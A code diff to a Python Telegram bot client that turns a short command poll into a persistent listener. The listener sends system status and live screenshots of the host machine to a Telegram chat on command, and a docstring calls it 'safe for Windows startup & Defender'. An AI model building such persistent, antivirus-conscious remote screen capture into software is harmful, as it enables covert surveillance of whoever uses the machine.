@@ -2,12 +2,17 @@
 
 import requests
 import time
-from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, REQUEST_TIMEOUT
 from logger import setup_logger
 from system_status import get_status_text
 from screenshot import capture_screenshot
 import os
+from config_loader import load_config
 
+CONFIG = load_config()
+
+TELEGRAM_BOT_TOKEN = CONFIG["telegram"]["bot_token"]
+TELEGRAM_CHAT_ID = CONFIG["telegram"]["chat_id"]
+REQUEST_TIMEOUT = 10
 logger = setup_logger()
 
 
@@ -51,50 +56,54 @@ class TelegramClient:
         logger.error("All Telegram send attempts failed")
         return False
 
-    def poll_commands(self, duration=30):
-        logger.info("Polling Telegram commands")
-        start_time = time.time()
+    def listen_forever(self):
+        """
+        Persistent Telegram command listener.
+        Safe for Windows startup & Defender.
+        """
+        logger.info("Entering persistent Telegram listener")
 
-        while time.time() - start_time < duration:
+        while True:
             try:
                 response = requests.get(
                     f"{self.base_url}/getUpdates",
-                    params={"timeout": 10, "offset": self.offset},
-                    timeout=REQUEST_TIMEOUT
+                    params={"timeout": 30, "offset": self.offset},
+                    timeout=REQUEST_TIMEOUT + 20
                 )
                 response.raise_for_status()
                 updates = response.json().get("result", [])
 
                 for update in updates:
                     self.offset = update["update_id"] + 1
-                    text = update.get("message", {}).get("text", "")
+                    text = update.get("message", {}).get("text", "").strip()
 
-                    if text.strip() == "/ping":
+                    if text == "/ping":
                         logger.info("/ping command received")
                         self.send_message(get_status_text())
 
-                    elif text.strip() == "/screenshot":
+                    elif text == "/screenshot":
                         logger.info("/screenshot command received")
+                        from screenshot import capture_screenshot
+                        import os
 
                         path = capture_screenshot()
                         if path:
-                            self.send_photo(
-                                path,
-                                caption="🖥 Current Screen"
-                            )
+                            self.send_photo(path, caption="🖥 Current Screen")
                             try:
                                 os.remove(path)
                             except Exception:
                                 pass
                         else:
-                            self.send_message("❌ Failed to capture screenshot")
+                            self.send_message("❌ Screenshot failed")
 
-            except requests.RequestException as e:
-                logger.warning(f"Polling error: {e}")
+            except requests.exceptions.ReadTimeout:
+                logger.warning("Telegram long-poll timeout (expected)")
+            except Exception as e:
+                logger.error(f"Listener error: {e}")
 
+            # Small sleep to avoid tight loop
             time.sleep(2)
 
-        logger.info("Command polling finished")
     def send_photo(self, photo_path: str, caption: str = "") -> bool:
         url = f"{self.base_url}/sendPhoto"
 
